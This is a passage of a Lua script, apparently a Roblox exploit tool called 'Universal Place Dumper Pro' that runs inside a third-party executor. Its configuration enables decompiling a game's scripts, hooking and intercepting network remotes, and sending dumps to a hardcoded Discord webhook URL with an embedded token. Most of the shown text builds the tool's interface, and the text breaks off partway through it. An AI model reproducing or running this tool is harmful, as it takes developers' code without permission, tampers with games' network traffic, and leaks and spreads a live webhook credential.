if not game:IsLoaded() then
	game.Loaded:Wait()
end
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local StarterGui = game:GetService("StarterGui")
local StarterPack = game:GetService("StarterPack")
local Workspace = game:GetService("Workspace")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
	Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
	LocalPlayer = Players.LocalPlayer
end
local env = (typeof(getgenv) == "function" and getgenv()) or _G
if type(env) == "table" and type(env.UNIVERSAL_DUMP_UNLOAD) == "function" then
	pcall(env.UNIVERSAL_DUMP_UNLOAD)
end

local VERSION = "0.4.6"
local Config = {
	mainDir = "UniversalDumper",
	debug = false,
	decompile = true,
	deobfuscate = true,
	dumpScriptConstants = true,
	dumpDebug = false,
	detailedDebug = false,
	threads = 1,
	timeout = 6,
	delay = 0,
	includeNil = true,
	includeBytecode = true,
	replaceUsername = true,
	disableRender = false,
	dumpTrees = true,
	dumpRemotes = true,
	dumpGui = true,
	dumpValues = true,
	dumpAttributes = true,
	fullProperties = false,
	hookNet = true,
	hookClientReceive = true,
	liveIntercept = true,
	liveConsole = false,
	liveFlushEvery = 8,
	liveWatchStats = true,
	liveWatchCharacter = true,
	liveInstallEarly = true,
	snapshotDiff = true,
	snapshotEvery = 20,
	maxSnapshots = 10,
	maxTreePerRoot = 60000,
	maxGui = 20000,
	maxScripts = 2000,
	skipCore = true,
	postHttp = true,
	httpSink = "https://discord.com/api/webhooks/1563279588207894661/1sVcZY6rmhkDsG4l8lSls1j59Um9Vc_jEaFnVbo-eRprpi2j-44DlRPElnNliHu_3fBs",
	webhookUrl = "https://discord.com/api/webhooks/1563279588207894661/1sVcZY6rmhkDsG4l8lSls1j59Um9Vc_jEaFnVbo-eRprpi2j-44DlRPElnNliHu_3fBs",
}
local SERIAL_CAPS = {
	stringMax = 4000,
	depth = 8,
	tableEntries = 300,
	argCount = 12,
}
local IGNORED_ANCESTORS = { "Chat", "CoreGui", "CorePackages" }
local IGNORED_NAMES = { "PlayerModule", "RbxCharacterSounds", "PlayerScriptsLoader", "ChatScript", "BubbleChat" }
local NETWORK_REMOTE_CLASSES = {
	RemoteEvent = true,
	RemoteFunction = true,
	UnreliableRemoteEvent = true,
}
local BINDABLE_CLASSES = {
	BindableEvent = true,
	BindableFunction = true,
}
local SCRIPT_CLASSES = {
	LocalScript = true,
	ModuleScript = true,
	Script = true,
}
local STATIC_REMOTE_METHODS = {
	"FireServer",
	"InvokeServer",
	"OnClientEvent",
	"OnClientInvoke",
	"FireClient",
}

local function pickFn(...)
	for i = 1, select("#", ...) do
		local fn = select(i, ...)
		if typeof(fn) == "function" then
			return fn
		end
	end
	return nil
end
local decompileFn = pickFn(typeof(decompile) == "function" and decompile, env and env.decompile, typeof(disassemble) == "function" and disassemble)
local getNilInstances = pickFn(typeof(getnilinstances) == "function" and getnilinstances, env and env.getnilinstances, typeof(get_nil_instances) == "function" and get_nil_instances)
local getScriptHash = pickFn(typeof(getscripthash) == "function" and getscripthash, env and env.getscripthash)
local getScriptClosure = pickFn(typeof(getscriptclosure) == "function" and getscriptclosure, env and env.getscriptclosure)
local getConstants = pickFn(typeof(getconstants) == "function" and getconstants, env and env.getconstants, debug and debug.getconstants)
local getProtos = pickFn(typeof(getprotos) == "function" and getprotos, env and env.getprotos, debug and debug.getprotos)
local getInfo = pickFn(typeof(getinfo) == "function" and getinfo, env and env.getinfo, debug and debug.getinfo)
local getScripts = pickFn(typeof(getscripts) == "function" and getscripts, env and env.getscripts)
local getRunningScripts = pickFn(typeof(getrunningscripts) == "function" and getrunningscripts, env and env.getrunningscripts)
local getLoadedModules = pickFn(typeof(getloadedmodules) == "function" and getloadedmodules, env and env.getloadedmodules)
local getBytecode = pickFn(typeof(getscriptbytecode) == "function" and getscriptbytecode, env and env.getscriptbytecode)
local getPropertiesFn = pickFn(typeof(getproperties) == "function" and getproperties, env and env.getproperties)
local getConnections = pickFn(typeof(getconnections) == "function" and getconnections, env and env.getconnections)
local hookMeta = pickFn(typeof(hookmetamethod) == "function" and hookmetamethod, env and env.hookmetamethod)
local hookFn = pickFn(typeof(hookfunction) == "function" and hookfunction, env and env.hookfunction, typeof(hookfunc) == "function" and hookfunc)
local getNamecall = pickFn(typeof(getnamecallmethod) == "function" and getnamecallmethod, env and env.getnamecallmethod)
local checkCaller = pickFn(typeof(checkcaller) == "function" and checkcaller, env and env.checkcaller)
local newClosure = pickFn(typeof(newcclosure) == "function" and newcclosure, env and env.newcclosure) or function(f)
	return f
end
local writeFile = pickFn(typeof(writefile) == "function" and writefile, env and env.writefile)
local readFile = pickFn(typeof(readfile) == "function" and readfile, env and env.readfile)
local listFiles = pickFn(typeof(listfiles) == "function" and listfiles, env and env.listfiles)
local makeFolder = pickFn(typeof(makefolder) == "function" and makefolder, env and env.makefolder)
local isFolder = pickFn(typeof(isfolder) == "function" and isfolder, env and env.isfolder)
local isFile = pickFn(typeof(isfile) == "function" and isfile, env and env.isfile)
local httpRequest = pickFn(
	typeof(request) == "function" and request,
	typeof(http_request) == "function" and http_request,
	(typeof(syn) == "table" and typeof(syn.request) == "function" and syn.request),
	(typeof(http) == "table" and typeof(http.request) == "function" and http.request),
	(typeof(fluxus) == "table" and typeof(fluxus.request) == "function" and fluxus.request),
	env and env.request,
	env and env.http_request
)

--//==================================================
--// UNIVERSAL DUMPER PRO UI & DIAGNOSTIC SUITE
--//==================================================
local DumperUI = nil
local UIConnections = {}
local ScriptRows = {}
local RemoteRows = {}
local RawLogRows = {}

local function trackUIConn(conn)
	if typeof(conn) == "RBXScriptConnection" then
		table.insert(UIConnections, conn)
	end
	return conn
end

local function createDumperUI()
	local getGuiParent = function()
		local ok, core = pcall(function() return game:GetService("CoreGui") end)
		if ok and core then return core end
		local lp = Players.LocalPlayer
		if lp then
			local pg = lp:FindFirstChildOfClass("PlayerGui")
			if pg then return pg end
		end
		return game:GetService("CoreGui")
	end

	local ScreenGui = Instance.new("ScreenGui")
	ScreenGui.Name = "UniversalDumperUI"
	ScreenGui.ResetOnSpawn = false
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	local protect = (typeof(syn) == "table" and syn.protect_gui) or (typeof(protectgui) == "function" and protectgui)
	if typeof(protect) == "function" then
		pcall(protect, ScreenGui)
	end
	ScreenGui.Parent = getGuiParent()

	local FONT_BOLD = Enum.Font.GothamBold
	local FONT_REG = Enum.Font.Gotham
	local FONT_MONO = Enum.Font.RobotoMono

	local THEME = {
		Bg = Color3.fromRGB(15, 18, 26),
		Header = Color3.fromRGB(20, 24, 34),
		Nav = Color3.fromRGB(18, 22, 30),
		Border = Color3.fromRGB(34, 40, 56),
		CardBg = Color3.fromRGB(22, 27, 38),
		CardHover = Color3.fromRGB(28, 34, 48),
		ConsoleBg = Color3.fromRGB(10, 12, 17),
		TextPrimary = Color3.fromRGB(245, 248, 255),
		TextSecondary = Color3.fromRGB(175, 185, 205),
		TextMuted = Color3.fromRGB(115, 128, 155),
		AccentCyan = Color3.fromRGB(0, 195, 245),
		AccentGreen = Color3.fromRGB(55, 225, 135),
		AccentOrange = Color3.fromRGB(250, 175, 45),
		AccentRed = Color3.fromRGB(240, 75, 85),
		AccentBlue = Color3.fromRGB(80, 145, 255),
		AccentPurple = Color3.fromRGB(165, 95, 255),
	}

	local function corner(inst, r)
		local c = Instance.new("UICorner")
		c.CornerRadius = UDim.new(0, r or 6)
		c.Parent = inst
		return c
	end

	local function stroke(inst, col, th)
		local s = Instance.new("UIStroke")
		s.Color = col or THEME.Border
		s.Thickness = th or 1
		s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		s.Parent = inst
		return s
	end

	-- Main Window Frame
	local MainFrame = Instance.new("Frame")
	MainFrame.Name = "MainFrame"
	MainFrame.Size = UDim2.fromOffset(620, 440)
	MainFrame.Position = UDim2.new(0.5, -310, 0.5, -220)
	MainFrame.BackgroundColor3 = THEME.Bg
	MainFrame.BorderSizePixel = 0
	MainFrame.ClipsDescendants = true
	MainFrame.Active = true
	MainFrame.Parent = ScreenGui
	corner(MainFrame, 8)
	stroke(MainFrame, THEME.Border, 1.5)

	-- Top Header Bar
	local Header = Instance.new("Frame")
	Header.Name = "Header"
	Header.Size = UDim2.new(1, 0, 0, 42)
	Header.BackgroundColor3 = THEME.Header
	Header.BorderSizePixel = 0
	Header.Parent = MainFrame

	local HeaderLine = Instance.new("Frame")
	HeaderLine.Size = UDim2.new(1, 0, 0, 1)
	HeaderLine.Position = UDim2.new(0, 0, 1, -1)
	HeaderLine.BackgroundColor3 = THEME.Border
	HeaderLine.BorderSizePixel = 0
	HeaderLine.Parent = Header

	local Title = Instance.new("TextLabel")
	Title.Text = "UNIVERSAL PLACE DUMPER PRO"
	Title.Font = FONT_BOLD
	Title.TextSize = 13
	Title.TextColor3 = THEME.TextPrimary
	Title.TextXAlignment = Enum.TextXAlignment.Left
	Title.BackgroundTransparency = 1
	Title.Position = UDim2.new(0, 14, 0, 0)
	Title.Size = UDim2.new(0, 230, 1, 0)
	Title.Parent = Header

	local VersionPill = Instance.new("TextLabel")
	VersionPill.Text = "v" .. VERSION
	VersionPill.Font = FONT_REG
	VersionPill.TextSize = 10
	VersionPill.TextColor3 = THEME.AccentCyan
	VersionPill.BackgroundColor3 = Color3.fromRGB(20, 40, 60)
	VersionPill.Size = UDim2.fromOffset(45, 18)
	VersionPill.Position = UDim2.new(0, 245, 0.5, -9)
	VersionPill.Parent = Header
	corner(VersionPill, 4)

	local StatusDot = Instance.new("Frame")
	StatusDot.Size = UDim2.fromOffset(8, 8)
	StatusDot.Position = UDim2.new(0, 302, 0.5, -4)
	StatusDot.BackgroundColor3 = THEME.AccentGreen
	StatusDot.BorderSizePixel = 0
	StatusDot.Parent = Header
	corner(StatusDot, 4)

	local StatusText = Instance.new("TextLabel")
	StatusText.Text = "RUNNING"
	StatusText.Font = FONT_BOLD
	StatusText.TextSize = 10
	StatusText.TextColor3 = THEME.AccentGreen
	StatusText.TextXAlignment = Enum.TextXAlignment.Left
	StatusText.BackgroundTransparency = 1
	StatusText.Position = UDim2.new(0, 315, 0, 0)
	StatusText.Size = UDim2.new(0, 80, 1, 0)
	StatusText.Parent = Header

	-- Header Controls: Unload & Minimize
	local UnloadBtn = Instance.new("TextButton")
	UnloadBtn.Name = "UnloadBtn"
	UnloadBtn.Size = UDim2.fromOffset(68, 26)
	UnloadBtn.Position = UDim2.new(1, -112, 0.5, -13)
	UnloadBtn.BackgroundColor3 = THEME.AccentRed
	UnloadBtn.Text = "Unload"
	UnloadBtn.Font = FONT_BOLD
	UnloadBtn.TextSize = 11
	UnloadBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	UnloadBtn.AutoButtonColor = true
	UnloadBtn.Parent = Header
	corner(UnloadBtn, 5)

	local MinimizeBtn = Instance.new("TextButton")
	MinimizeBtn.Name = "MinimizeBtn"
	MinimizeBtn.Size = UDim2.fromOffset(28, 26)
	MinimizeBtn.Position = UDim2.new(1, -38, 0.5, -13)
	MinimizeBtn.BackgroundColor3 = THEME.CardBg
	MinimizeBtn.Text = "—"
	MinimizeBtn.Font = FONT_BOLD
	MinimizeBtn.TextSize = 13
	MinimizeBtn.TextColor3 = THEME.TextMuted
	MinimizeBtn.AutoButtonColor = true
	MinimizeBtn.Parent = Header
	corner(MinimizeBtn, 5)
	stroke(MinimizeBtn, THEME.Border, 1)

	-- Window Dragging Logic
	local dragging, dragStart, startPos
	trackUIConn(Header.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = MainFrame.Position
		end
	end))

	trackUIConn(game:GetService("UserInputService").InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
			MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end
	end))

	trackUIConn(game:GetService("UserInputService").InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end))

	-- Navigation Tab Bar
	local NavFrame = Instance.new("Frame")
	NavFrame.Name = "NavFrame"
	NavFrame.Size = UDim2.new(1, 0, 0, 34)
	NavFrame.Position = UDim2.new(0, 0, 0, 42)
	NavFrame.BackgroundColor3 = THEME.Nav
	NavFrame.BorderSizePixel = 0
	NavFrame.Parent = MainFrame

	local NavBottomLine = Instance.new("Frame")
	NavBottomLine.Size = UDim2.new(1, 0, 0, 1)
	NavBottomLine.Position = UDim2.new(0, 0, 1, -1)
	NavBottomLine.BackgroundColor3 = THEME.Border
	NavBottomLine.BorderSizePixel = 0
	NavBottomLine.Parent = NavFrame

	local BodyContainer = Instance.new("Frame")
	BodyContainer.Name = "BodyContainer"
	BodyContainer.Size = UDim2.new(1, 0, 1, -76)
	BodyContainer.Position = UDim2.new(0, 0, 0, 76)
	BodyContainer.BackgroundTransparency = 1
	BodyContainer.Parent = MainFrame

	-- Tab Management
	local tabs = {}
	local activeTab = nil
	local tabButtons = {}

	local function switchTab(name)
		for tabName, page in pairs(tabs) do
			page.Visible = (tabName == name)
		end
		for tabName, btn in pairs(tabButtons) do
			if tabName == name then
				btn.TextColor3 = THEME.TextPrimary
				btn.BackgroundColor3 = THEME.CardBg
			else
				btn.TextColor3 = THEME.TextMuted
				btn.BackgroundColor3 = THEME.Nav
			end
		end
		activeTab = name
	end

	local function addTabButton(name, text, xPos, width)
		local btn = Instance.new("TextButton")
		btn.Name = "Tab_" .. name
		btn.Size = UDim2.fromOffset(width, 28)
		btn.Position = UDim2.new(0, xPos, 0.5, -14)
		btn.BackgroundColor3 = THEME.Nav
		btn.Text = text
		btn.Font = FONT_BOLD
		btn.TextSize = 11
		btn.TextColor3 = THEME.TextMuted
		btn.AutoButtonColor = true
		btn.Parent = NavFrame
		corner(btn, 5)

		trackUIConn(btn.MouseButton1Click:Connect(function()
			switchTab(name)
		end))
		tabButtons[name] = btn
		return btn
	end

	local btnWidth = 116
	addTabButton("Dashboard", "📊 Dashboard", 10, btnWidth)
	addTabButton("Terminal", "📜 Terminal", 10 + (btnWidth + 6), btnWidth)
	addTabButton("Scripts", "🔍 Scripts", 10 + (btnWidth + 6) * 2, btnWidth)
	addTabButton("Remotes", "📡 Remotes", 10 + (btnWidth + 6) * 3, btnWidth)
	addTabButton("Settings", "⚙️ Settings", 10 + (btnWidth + 6) * 4, btnWidth)

	-- Minimize toggle logic
	local isMinimized = false
	trackUIConn(MinimizeBtn.MouseButton1Click:Connect(function()
		isMinimized = not isMinimized
		if isMinimized then
			MainFrame.Size = UDim2.fromOffset(620, 42)
			NavFrame.Visible = false
			BodyContainer.Visible = false
			MinimizeBtn.Text = "+"
		else
			MainFrame.Size = UDim2.fromOffset(620, 440)
			NavFrame.Visible = true
			BodyContainer.Visible = true
			MinimizeBtn.Text = "—"
		end
	end))

	--==================================================
	-- 1. TAB: DASHBOARD
	--==================================================
	local PageDashboard = Instance.new("Frame")
	PageDashboard.Name = "Page_Dashboard"
	PageDashboard.Size = UDim2.new(1, 0, 1, 0)
	PageDashboard.BackgroundTransparency = 1
	PageDashboard.Parent = BodyContainer
	tabs["Dashboard"] = PageDashboard

	-- Progress Box
	local ProgressSection = Instance.new("Frame")
	ProgressSection.Name = "ProgressSection"
	ProgressSection.Size = UDim2.new(1, -28, 0, 48)
	ProgressSection.Position = UDim2.new(0, 14, 0, 10)
	ProgressSection.BackgroundColor3 = THEME.CardBg
	ProgressSection.BorderSizePixel = 0
	ProgressSection.Parent = PageDashboard
	corner(ProgressSection, 6)
	stroke(ProgressSection, THEME.Border, 1)

	local PhasePill = Instance.new("TextLabel")
	PhasePill.Text = "PHASE: BOOT"
	PhasePill.Font = FONT_BOLD
	PhasePill.TextSize = 10
	PhasePill.TextColor3 = THEME.AccentCyan
	PhasePill.TextXAlignment = Enum.TextXAlignment.Left
	PhasePill.BackgroundTransparency = 1
	PhasePill.Size = UDim2.new(0.6, 0, 0, 16)
	PhasePill.Position = UDim2.new(0, 10, 0, 6)
	PhasePill.Parent = ProgressSection

	local ProgressPercent = Instance.new("TextLabel")
	ProgressPercent.Text = "0%"
	ProgressPercent.Font = FONT_BOLD
	ProgressPercent.TextSize = 11
	ProgressPercent.TextColor3 = THEME.TextPrimary
	ProgressPercent.TextXAlignment = Enum.TextXAlignment.Right
	ProgressPercent.BackgroundTransparency = 1
	ProgressPercent.Size = UDim2.new(0.4, 0, 0, 16)
	ProgressPercent.Position = UDim2.new(0.6, -10, 0, 6)
	ProgressPercent.Parent = ProgressSection

	local BarBack = Instance.new("Frame")
	BarBack.Size = UDim2.new(1, -20, 0, 8)
	BarBack.Position = UDim2.new(0, 10, 0, 24)
	BarBack.BackgroundColor3 = THEME.ConsoleBg
	BarBack.BorderSizePixel = 0
	BarBack.Parent = ProgressSection
	corner(BarBack, 4)

	local BarFill = Instance.new("Frame")
	BarFill.Size = UDim2.new(0.02, 0, 1, 0)
	BarFill.BackgroundColor3 = THEME.AccentCyan
	BarFill.BorderSizePixel = 0
	BarFill.Parent = BarBack
	corner(BarFill, 4)

	local StatusDetail = Instance.new("TextLabel")
	StatusDetail.Text = "Initializing place dumper subsystem..."
	StatusDetail.Font = FONT_REG
	StatusDetail.TextSize = 9
	StatusDetail.TextColor3 = THEME.TextMuted
	StatusDetail.TextXAlignment = Enum.TextXAlignment.Left
	StatusDetail.BackgroundTransparency = 1
	StatusDetail.Size = UDim2.new(1, -20, 0, 12)
	StatusDetail.Position = UDim2.new(0, 10, 0, 34)
	StatusDetail.Parent = ProgressSection

	-- 4 Metrics Cards
	local MetricsFrame = Instance.new("Frame")
	MetricsFrame.Size = UDim2.new(1, -28, 0, 52)
	MetricsFrame.Position = UDim2.new(0, 14, 0, 64)
	MetricsFrame.BackgroundTransparency = 1
	MetricsFrame.Parent = PageDashboard

	local function createCard(name, defaultVal, subText, xOffset, width)
		local card = Instance.new("Frame")
		card.Size = UDim2.new(0, width, 1, 0)
		card.Position = UDim2.new(0, xOffset, 0, 0)
		card.BackgroundColor3 = THEME.CardBg
		card.BorderSizePixel = 0
		card.Parent = MetricsFrame
		corner(card, 6)
		stroke(card, THEME.Border, 1)

		local tLbl = Instance.new("TextLabel")
		tLbl.Text = string.upper(name)
		tLbl.Font = FONT_BOLD
		tLbl.TextSize = 9
		tLbl.TextColor3 = THEME.TextMuted
		tLbl.TextXAlignment = Enum.TextXAlignment.Left
		tLbl.BackgroundTransparency = 1
		tLbl.Position = UDim2.new(0, 8, 0, 4)
		tLbl.Size = UDim2.new(1, -16, 0, 12)
		tLbl.Parent = card

		local vLbl = Instance.new("TextLabel")
		vLbl.Text = defaultVal
		vLbl.Font = FONT_BOLD
		vLbl.TextSize = 13
		vLbl.TextColor3 = THEME.TextPrimary
		vLbl.TextXAlignment = Enum.TextXAlignment.Left
		vLbl.BackgroundTransparency = 1
		vLbl.Position = UDim2.new(0, 8, 0, 18)
		vLbl.Size = UDim2.new(1, -16, 0, 16)
		vLbl.Parent = card

		local sLbl = Instance.new("TextLabel")
		sLbl.Text = subText
		sLbl.Font = FONT_REG
		sLbl.TextSize = 9
		sLbl.TextColor3 = THEME.TextMuted
		sLbl.TextXAlignment = Enum.TextXAlignment.Left
		sLbl.BackgroundTransparency = 1
		sLbl.Position = UDim2.new(0, 8, 0, 36)
		sLbl.Size = UDim2.new(1, -16, 0, 12)
		sLbl.Parent = card

		return vLbl, sLbl
	end

	local cWidth = math.floor((620 - 28 - 24) / 4) -- 142
	local dashScriptsVal, dashScriptsSub = createCard("Scripts", "0 / 0", "0 dumped", 0, cWidth)
	local dashRemotesVal, dashRemotesSub = createCard("Remotes", "0", "0 hooked", (cWidth + 8), cWidth)
	local dashWritesVal, dashWritesSub = createCard("Writes", "0 OK", "0 failed", (cWidth + 8) * 2, cWidth)
	local dashTimeVal, dashTimeSub = createCard("Elapsed", "00:00", "active", (cWidth + 8) * 3, cWidth)

	-- Info & Details Box
	local InfoCard = Instance.new("Frame")
	InfoCard.Size = UDim2.new(1, -28, 0, 96)
	InfoCard.Position = UDim2.new(0, 14, 0, 124)
	InfoCard.BackgroundColor3 = THEME.CardBg
	InfoCard.BorderSizePixel = 0
	InfoCard.Parent = PageDashboard
	corner(InfoCard, 6)
	stroke(InfoCard, THEME.Border, 1)

	local function addInfoRow(key, val, yPos)
		local kLbl = Instance.new("TextLabel")
		kLbl.Text = key
		kLbl.Font = FONT_BOLD
		kLbl.TextSize = 10
		kLbl.TextColor3 = THEME.TextMuted
		kLbl.TextXAlignment = Enum.TextXAlignment.Left
		kLbl.BackgroundTransparency = 1
		kLbl.Position = UDim2.new(0, 12, 0, yPos)
		kLbl.Size = UDim2.new(0, 110, 0, 18)
		kLbl.Parent = InfoCard

		local vLbl = Instance.new("TextLabel")
		vLbl.Text = val
		vLbl.Font = FONT_REG
		vLbl.TextSize = 10
		vLbl.TextColor3 = THEME.TextSecondary
		vLbl.TextXAlignment = Enum.TextXAlignment.Left
		vLbl.BackgroundTransparency = 1
		vLbl.Position = UDim2.new(0, 125, 0, yPos)
		vLbl.Size = UDim2.new(1, -137, 0, 18)
		vLbl.Parent = InfoCard
		return vLbl
	end

	local infoPlaceLbl = addInfoRow("Place Target:", tostring(game.PlaceId) .. " (" .. tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Game") .. ")", 8)
	local infoUserLbl = addInfoRow("Executor Client:", (identifyexecutor and identifyexecutor() or "Executor") .. " | " .. (LocalPlayer and LocalPlayer.Name or "Player"), 30)
	local infoOutLbl = addInfoRow("Disk Workspace:", "UniversalDumper/...", 52)
	local infoWebLbl = addInfoRow("Webhook Sink:", "Active (" .. (Config.postHttp and "Enabled" or "Disabled") .. ")", 74)

	-- Mini Console in Dashboard
	local MiniConsole = Instance.new("Frame")
	MiniConsole.Size = UDim2.new(1, -28, 0, 96)
	MiniConsole.Position = UDim2.new(0, 14, 0, 226)
	MiniConsole.BackgroundColor3 = THEME.ConsoleBg
	MiniConsole.BorderSizePixel = 0
	MiniConsole.ClipsDescendants = true
	MiniConsole.Parent = PageDashboard
	corner(MiniConsole, 6)
	stroke(MiniConsole, THEME.Border, 1)

	local MiniScroll = Instance.new("ScrollingFrame")
	MiniScroll.Size = UDim2.new(1, -8, 1, -8)
	MiniScroll.Position = UDim2.new(0, 4, 0, 4)
	MiniScroll.BackgroundTransparency = 1
	MiniScroll.BorderSizePixel = 0
	MiniScroll.ScrollBarThickness = 3
	MiniScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
	MiniScroll.Parent = MiniConsole

	local MiniLayout = Instance.new("UIListLayout")
	MiniLayout.SortOrder = Enum.SortOrder.LayoutOrder
	MiniLayout.Padding = UDim.new(0, 1)
	MiniLayout.Parent = MiniScroll

	trackUIConn(MiniLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		MiniScroll.CanvasSize = UDim2.new(0, 0, 0, MiniLayout.AbsoluteContentSize.Y + 4)
		MiniScroll.CanvasPosition = Vector2.new(0, math.max(0, MiniLayout.AbsoluteContentSize.Y - MiniScroll.AbsoluteSize.Y + 8))
	end))

	-- Bottom Quick Action Bar
	local DashFooter = Instance.new("Frame")
	DashFooter.Size = UDim2.new(1, -28, 0, 26)
	DashFooter.Position = UDim2.new(0, 14, 0, 328)
	DashFooter.BackgroundTransparency = 1
	DashFooter.Parent = PageDashboard

	local DispatchNowBtn = Instance.new("TextButton")
	DispatchNowBtn.Size = UDim2.fromOffset(130, 24)
	DispatchNowBtn.Position = UDim2.new(0, 0, 0, 0)
	DispatchNowBtn.BackgroundColor3 = THEME.CardBg
	DispatchNowBtn.Text = "🚀 Dispatch Webhook"
	DispatchNowBtn.Font = FONT_BOLD
	DispatchNowBtn.TextSize = 10
	DispatchNowBtn.TextColor3 = THEME.AccentCyan
	DispatchNowBtn.AutoButtonColor = true
	DispatchNowBtn.Parent = DashFooter
	corner(DispatchNowBtn, 4)
	stroke(DispatchNowBtn, THEME.Border, 1)

	local CopyPathBtn = Instance.new("TextButton")
	CopyPathBtn.Size = UDim2.fromOffset(110, 24)
	CopyPathBtn.Position = UDim2.new(0, 138, 0, 0)
	CopyPathBtn.BackgroundColor3 = THEME.CardBg
	CopyPathBtn.Text = "📋 Copy Path"
	CopyPathBtn.Font = FONT_BOLD
	CopyPathBtn.TextSize = 10
	CopyPathBtn.TextColor3 = THEME.TextSecondary
	CopyPathBtn.AutoButtonColor = true
	CopyPathBtn.Parent = DashFooter
	corner(CopyPathBtn, 4)
	stroke(CopyPathBtn, THEME.Border, 1)

	local WebhookStatusBadge = Instance.new("TextLabel")
	WebhookStatusBadge.Text = "Webhook: Standby"
	WebhookStatusBadge.Font = FONT_BOLD
	WebhookStatusBadge.TextSize = 10
	WebhookStatusBadge.TextColor3 = THEME.AccentOrange
	WebhookStatusBadge.TextXAlignment = Enum.TextXAlignment.Right
	WebhookStatusBadge.BackgroundTransparency = 1
	WebhookStatusBadge.Size = UDim2.new(0.5, 0, 1, 0)
	WebhookStatusBadge.Position = UDim2.new(0.5, 0, 0, 0)
	WebhookStatusBadge.Parent = DashFooter

	--==================================================
	-- 2. TAB: FULL TERMINAL
	--==================================================
	local PageTerminal = Instance.new("Frame")
	PageTerminal.Name = "Page_Terminal"
	PageTerminal.Size = UDim2.new(1, 0, 1, 0)
	PageTerminal.BackgroundTransparency = 1
	PageTerminal.Visible = false
	PageTerminal.Parent = BodyContainer
	tabs["Terminal"] = PageTerminal

	local TermHeader = Instance.new("Frame")
	TermHeader.Size = UDim2.new(1, -28, 0, 28)
	TermHeader.Position = UDim2.new(0, 14, 0, 8)
	TermHeader.BackgroundTransparency = 1
	TermHeader.Parent = PageTerminal

	local FilterBox = Instance.new("TextBox")
	FilterBox.Size = UDim2.new(0, 200, 0, 24)
	FilterBox.Position = UDim2.new(0, 0, 0, 2)
	FilterBox.BackgroundColor3 = THEME.CardBg
	FilterBox.Text = ""
	FilterBox.PlaceholderText = "Search logs..."
	FilterBox.PlaceholderColor3 = THEME.TextMuted
	FilterBox.Font = FONT_REG
	FilterBox.TextSize = 10
	FilterBox.TextColor3 = THEME.TextPrimary
	FilterBox.TextXAlignment = Enum.TextXAlignment.Left
	FilterBox.Parent = TermHeader
	corner(FilterBox, 4)
	stroke(FilterBox, THEME.Border, 1)

	local ClearLogsBtn = Instance.new("TextButton")
	ClearLogsBtn.Size = UDim2.fromOffset(60, 24)
	ClearLogsBtn.Position = UDim2.new(1, -60, 0, 2)
	ClearLogsBtn.BackgroundColor3 = THEME.CardBg
	ClearLogsBtn.Text = "Clear"
	ClearLogsBtn.Font = FONT_BOLD
	ClearLogsBtn.TextSize = 10
	ClearLogsBtn.TextColor3 = THEME.TextMuted
	ClearLogsBtn.Parent = TermHeader
	corner(ClearLogsBtn, 4)
	stroke(ClearLogsBtn, THEME.Border, 1)

	local TermFrame = Instance.new("Frame")
	TermFrame.Size = UDim2.new(1, -28, 1, -44)
	TermFrame.Position = UDim2.new(0, 14, 0, 38)
	TermFrame.BackgroundColor3 = THEME.ConsoleBg
	TermFrame.BorderSizePixel = 0
	TermFrame.ClipsDescendants = true
	TermFrame.Parent = PageTerminal
	corner(TermFrame, 6)
	stroke(TermFrame, THEME.Border, 1)

	local TermScroll = Instance.new("ScrollingFrame")
	TermScroll.Size = UDim2.new(1, -8, 1, -8)
	TermScroll.Position = UDim2.new(0, 4, 0, 4)
	TermScroll.BackgroundTransparency = 1
	TermScroll.BorderSizePixel = 0
	TermScroll.ScrollBarThickness = 5
	TermScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
	TermScroll.Parent = TermFrame

	local TermLayout = Instance.new("UIListLayout")
	TermLayout.SortOrder = Enum.SortOrder.LayoutOrder
	TermLayout.Padding = UDim.new(0, 2)
	TermLayout.Parent = TermScroll

	trackUIConn(TermLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		TermScroll.CanvasSize = UDim2.new(0, 0, 0, TermLayout.AbsoluteContentSize.Y + 6)
		TermScroll.CanvasPosition = Vector2.new(0, math.max(0, TermLayout.AbsoluteContentSize.Y - TermScroll.AbsoluteSize.Y + 12))
	end))

	--==================================================
	-- 3. TAB: SCRIPT EXPLORER
	--==================================================
	local PageScripts = Instance.new("Frame")
	PageScripts.Name = "Page_Scripts"
	PageScripts.Size = UDim2.new(1, 0, 1, 0)
	PageScripts.BackgroundTransparency = 1
	PageScripts.Visible = false
	PageScripts.Parent = BodyContainer
	tabs["Scripts"] = PageScripts

	local ScriptHeader = Instance.new("Frame")
	ScriptHeader.Size = UDim2.new(1, -28, 0, 28)
	ScriptHeader.Position = UDim2.new(0, 14, 0, 8)
	ScriptHeader.BackgroundTransparency = 1
	ScriptHeader.Parent = PageScripts

	local ScriptSearch = Instance.new("TextBox")
	ScriptSearch.Size = UDim2.new(0, 240, 0, 24)
	ScriptSearch.Position = UDim2.new(0, 0, 0, 2)
	ScriptSearch.BackgroundColor3 = THEME.CardBg
	ScriptSearch.Text = ""
	ScriptSearch.PlaceholderText = "Filter scripts by path or name..."
	ScriptSearch.PlaceholderColor3 = THEME.TextMuted
	ScriptSearch.Font = FONT_REG
	ScriptSearch.TextSize = 10
	ScriptSearch.TextColor3 = THEME.TextPrimary
